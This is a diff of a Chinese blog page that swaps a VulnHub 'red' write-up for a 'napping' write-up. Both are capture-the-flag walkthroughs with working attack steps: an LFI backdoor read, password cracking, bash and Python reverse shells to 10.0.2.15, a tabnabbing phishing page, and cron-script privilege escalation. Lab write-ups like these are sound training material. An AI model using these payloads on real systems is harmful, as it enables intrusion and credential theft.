@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/06/08/red/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/06/09/napping/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/06/08/red/" class="post-title-link" itemprop="url">red</a>
+          <a href="/2023/06/09/napping/" class="post-title-link" itemprop="url">napping</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-06-08 23:28:35" itemprop="dateCreated datePublished" datetime="2023-06-08T23:28:35+08:00">2023-06-08</time>
+      <time title="创建时间：2023-06-09 11:21:47" itemprop="dateCreated datePublished" datetime="2023-06-09T11:21:47+08:00">2023-06-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -252,7 +252,7 @@
     </span>
 
   
-    <span id="/2023/06/08/red/" class="post-meta-item leancloud_visitors" data-flag-title="red" title="阅读次数">
+    <span id="/2023/06/09/napping/" class="post-meta-item leancloud_visitors" data-flag-title="napping" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>5.9k</span>
+      <span>2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>5 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -283,90 +283,60 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/red-1,753/">https://www.vulnhub.com/entry/red-1,753/</a></p>
+          <p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/napping-101,752/">https://www.vulnhub.com/entry/napping-101,752/</a></p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用<code>sudo arp-scan -I eth0 -l</code>获取主机IP地址</p>
-<p><img src="/images/red/image-20230608233224432.png" alt="image-20230608233224432"></p>
-<p>使用<code>nmap -sC -sV -p 1-10000 -o result.txt 10.0.2.8</code>获取端口信息</p>
-<p><img src="/images/red/image-20230608233402196.png" alt="image-20230608233402196"></p>
-<p>访问之后，点击链接发现会跳转一个域名，但是无法访问</p>
-<p><img src="/images/red/image-20230608233725065.png" alt="image-20230608233725065"></p>
-<p>我们要加入<code>hosts</code></p>
-<p><img src="/images/red/image-20230608233816452.png" alt="image-20230608233816452"></p>
-<p>然后发现了一些提示</p>
-<p><img src="/images/red/image-20230608233840749.png" alt="image-20230608233840749"></p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your site has been Hacked! You’ll never find the backdoor hahahah</span><br><span class="line">你的网站被黑了!你永远找不到后门的，哈哈哈</span><br></pre></td></tr></table></figure>
+<p><img src="/images/napping/image-20230609112341966.png" alt="image-20230609112341966"></p>
+<p>使用nmap进行扫描，<code>nmap -sC -sV -p 1-10000 -o result.txt 10.0.2.9</code></p>
+<p><img src="/images/napping/image-20230609112432317.png" alt="image-20230609112432317"></p>
+<p><img src="/images/napping/image-20230609112510535.png" alt="image-20230609112510535"></p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>首先注册一个账号进行登录</p>
+<p><img src="/images/napping/image-20230609112634759.png" alt="image-20230609112634759"></p>
+<p>输入一个URL，查看源码发现有记录</p>
+<p><img src="/images/napping/image-20230609112712834.png" alt="image-20230609112712834"></p>
+<p>因为写了投稿，后台可能会进行检查吧，就可能存在钓鱼……</p>
+<p>然后将前端页面使用wget下载下来，然后伪造一个钓鱼页面</p>
+<blockquote>
+<p>monkey111.html[钓鱼页面]</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">opener</span>) <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">parent</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;http://10.0.2.15:8000/index.html&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">opener</span>  != <span class="variable language_">window</span>) <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">parent</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;http://10.0.2.15:8000/index.html&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>有后门文件，这里使用<code>dirsearch</code>进行扫描</p>
+<p>然后使用<code>python3 -m http.server 80</code>开启http服务，使用<code>nc -lvnp 8000</code>监听8000端口</p>
+<p>链接填写钓鱼页面链接</p>
+<p><img src="/images/napping/image-20230609113336548.png" alt="image-20230609113336548"></p>
+<p><img src="/images/napping/image-20230609113353220.png" alt="image-20230609113353220"></p>
+<p><img src="/images/napping/image-20230609113402284.png" alt="image-20230609113402284"></p>
 <blockquote>
-<p>dirsearch dir -w “&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;web&#x2F;dic&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;CommonBackdoors-PHP.fuzz.txt” -u “<a target="_blank" rel="noopener" href="http://redrocks.win/">http://redrocks.win/</a>“ -e “php”</p>
+<p>username&#x3D;daniel</p>
+<p>password&#x3D;C@ughtm3napping123</p>
 </blockquote>
-<p><img src="/images/red/image-20230608234009524.png" alt="image-20230608234009524"></p>
-<p>发现显示的状态码是500，搜索一下这个文件的作用</p>
-<p><img src="/images/red/image-20230608234105043.png" alt="image-20230608234105043"></p>
-<p>可能是一个webshell，需要传参，使用fuzz字典进行爆破</p>
-<blockquote>
-<p>wfuzz -c -u “<a target="_blank" rel="noopener" href="http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test">http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test</a>“ -w “&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;web&#x2F;dic&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;burp-parameter-names.txt”</p>
-</blockquote>
-<p><img src="/images/red/image-20230608234426440.png" alt="image-20230608234426440"></p>
-<p>经过手工测试发现存在文件读取漏洞</p>
-<p><img src="/images/red/image-20230608234604233.png" alt="image-20230608234604233"></p>
-<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><h3 id="查找后门"><a href="#查找后门" class="headerlink" title="查找后门"></a>查找后门</h3><p>使用<code>php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php</code>读取<code>NetworkFileManagerPHP.php</code>源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&quot;NetworkFileManagerPHP.php&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>参试网站进行登录发现失败了，这是我们会想到还有ssh服务可以参试，发现成功登录</p>
+<p><img src="/images/napping/image-20230609113530928.png" alt="image-20230609113530928"></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>使用<code>groups</code>查看发现该用户还有管理员的一点权限</p>
+<p><img src="/images/napping/image-20230609113717694.png" alt="image-20230609113717694"></p>
+<p>使用<code>find / -group administrators -type f 2&gt;/dev/null</code>查看我们使用命令能够访问的文件</p>
+<p><img src="/images/napping/image-20230609113806275.png" alt="image-20230609113806275"></p>
+<p>查看其内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://127.0.0.1/&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;site_status.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dt_string = now.strftime(<span class="string">&quot;%d/%m/%Y %H:%M:%S&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;Site is Up: &quot;</span>)</span><br><span class="line">    f.write(dt_string)</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;site_status.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dt_string = now.strftime(<span class="string">&quot;%d/%m/%Y %H:%M:%S&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;Check Out Site: &quot;</span>)</span><br><span class="line">    f.write(dt_string)</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>解码注释：</p>
-</blockquote>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">That password alone won&#x27;t help you! Hashcat says rules are rules</span><br><span class="line">单凭密码是帮不了你的!Hashcat说规则就是规则</span><br></pre></td></tr></table></figure>
+<p><img src="/images/napping/image-20230609114319358.png" alt="image-20230609114319358"></p>
+<p>发现规律，大概是两分钟执行一次，而且执行权限比较高，可以用来提权</p>
+<p><img src="/images/napping/image-20230609114411154.png" alt="image-20230609114411154"></p>
+<p>加入以下内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, subprocess, os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;10.0.2.15&quot;</span>,<span class="number">8888</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
 
-<p>hashcat、john登录、base64，查资料发现这里提示的是hashcat的base64规则为密码突变</p>
-<p>因为这里使用的WordPress，其配置文件在<code>wp-config.php</code>中，我们进行读取</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the installation.</span></span><br><span class="line"><span class="comment"> * You don&#x27;t have to use the web site, you can copy this file to &quot;wp-config.php&quot;</span></span><br><span class="line"><span class="comment"> * and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/editing-wp-config-php/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;john&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;R3v_m4lwh3r3_k1nG!!&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FS_METHOD&#x27;</span>, <span class="string">&#x27;direct&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_SITEURL&#x27;</span>, <span class="string">&#x27;http://redrocks.win&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_HOME&#x27;</span>, <span class="string">&#x27;http://redrocks.win&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication unique keys and salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases! You can generate these using</span></span><br><span class="line"><span class="comment"> * the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies.</span></span><br><span class="line"><span class="comment"> * This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;2uuBvc8SO5&#123;&gt;UwQ&lt;^5V5[UHBw%N&#125;-BwWqw|&gt;&lt;*HfBwJ( $&amp;%,(Zbg/jwFkRHf~v|&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;ah&#125;&lt;I`52GL6C^@~x C9FpMq-)txgOmA&lt;~&#123;R5ktY/@.]dBF?keB3&#125;+Y^u!a54 Xc(&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;[a!K&#125;D&lt;7-vB3Y&amp;x_&lt;3e]Wd+J]!o+A:U@QUZ-RU1]tO@/N&#125;b&#125;R@+/$+u*pJ|Z(xu-&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27; g4|@~:h,K29D&#125;$FL-f/eujw(VT;8wa7xRWpVR: &gt;&#125;,]!Ez.48E:ok 8Ip~5_o+a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;a;,O&lt;~vbpL+|@W+!Rs1o,T$r9(LwaXI =I7ZW$.Z[+BQ=B6QG7nr+w_bQ6B]5q4c&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;GkU:% Lo&#125; 9&#125;w38i:%]=uq&amp;J6Z&amp;RR#v2vsB5a_ +.[us;6mE+|$x*+ D*Ke+:Nt:&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;#`F9&amp;pm_jY&#125;N3y0&amp;8Z]EeL)z,$39,yFc$Nq`jGOMT_aM*`&lt;$9A:9&lt;Kk^L&#125;fX@+iZ&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;hTlFE*6zlZMbqluz)hf:-:x-:l89fC4otci;38|i`7eU1;+k[!0[ZG.oCt2@-y3X&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress database table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the documentation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/debugging-in-wordpress/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add any custom values between this line and the &quot;stop editing&quot; line. */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="title function_ invoke__">defined</span>( <span class="string">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class="line">	<span class="title function_ invoke__">define</span>( <span class="string">&#x27;ABSPATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span> ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/napping/image-20230609114452648.png" alt="image-20230609114452648"></p>
+<p>本地监听端口，然后过一段时间就会反弹shell</p>
+<p><img src="/images/napping/image-20230609114607516.png" alt="image-20230609114607516"></p>
+<p>然后使用python获取更完整的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=xterm-256color</span><br><span class="line">export SHELL=/bin/bash</span><br><span class="line">stty size</span><br><span class="line">	这里的值是多少，最后的值也要修改为多少</span><br><span class="line">	</span><br><span class="line">使用Crtl+Z，然后输入下面的内容</span><br><span class="line">stty raw -echo;fg</span><br><span class="line">直接输入下面的内容</span><br><span class="line">	reset</span><br><span class="line">stty rows 0 columns 0</span><br></pre></td></tr></table></figure>
 
-<p>获取到数据库的密码<code>R3v_m4lwh3r3_k1nG!!</code>，账户为<code>john</code>，而账户里面有<code>john</code></p>
-<p><img src="/images/red/image-20230608235127511.png" alt="image-20230608235127511"></p>
-<h3 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h3><p>将密码保存到文件当中，然后使用<code>hashcat</code>的规则进行破解</p>
-<blockquote>
-<p>hashcat –stdout pass.txt -r &#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;rules&#x2F;best64.rule &gt; passlist.txt</p>
-</blockquote>
-<p><img src="/images/red/image-20230608235732613.png" alt="image-20230608235732613"></p>
-<p>然后使用<code>hydra</code>爆破ssh密码</p>
-<blockquote>
-<p>hydra -l john -P passlist.txt 10.0.2.8 ssh</p>
-</blockquote>
-<p><img src="/images/red/image-20230608235825582.png" alt="image-20230608235825582"></p>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用ssh进行登录，然后会发现<code>cat</code>命令被替换为了<code>vi</code>，而<code>vi</code>被替换为了<code>cat</code>，这个shell也是不稳定的，所以这里可以使用bash反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">本地监听端口：nc -lvnp 1234</span><br><span class="line">靶机执行反弹shell命令：bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.2.15/1234 0&gt;&amp;1&#x27;</span><br><span class="line"></span><br><span class="line">因为这里这个shell不好用，所以可以使用python升级shell</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=xterm</span><br><span class="line"></span><br><span class="line">然后Crtl+Z，再执行下面的命令</span><br><span class="line">stty raw -echo;fg;</span><br><span class="line"></span><br><span class="line">最后输入下面的命令回车</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
-
-<p>使用<code>sudo -l</code>查看权限发现会以<code>ippsec</code>去执行<code>/usr/bin/time</code>命令</p>
-<p><img src="/images/red/image-20230609000724878.png" alt="image-20230609000724878"></p>
-<p>所以这里可以提权，使用<code>sudo -u ippsec /usr/bin/time /bin/bash</code></p>
-<p>再次使用上面的python命令进行升级shell</p>
-<p><img src="/images/red/image-20230609001140040.png" alt="image-20230609001140040"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s">pspy64s</a>进行检查</p>
-<blockquote>
-<p>wget  <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s">https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s</a></p>
-</blockquote>
-<p><img src="/images/red/image-20230609001426059.png" alt="image-20230609001426059"></p>
-<p>然后增加执行权限并运行</p>
-<p><img src="/images/red/image-20230609001524980.png" alt="image-20230609001524980"></p>
-<p><img src="/images/red/image-20230609001833844.png" alt="image-20230609001833844"></p>
-<p>进入该目录下面，然后查看其内容</p>
-<blockquote>
-<p>cd &#x2F;var&#x2F;www&#x2F;wordpress&#x2F;.git&#x2F;</p>
-<p>vi supersecretfileuc.c</p>
-</blockquote>
-<p><img src="/images/red/image-20230609001924443.png" alt="image-20230609001924443"></p>
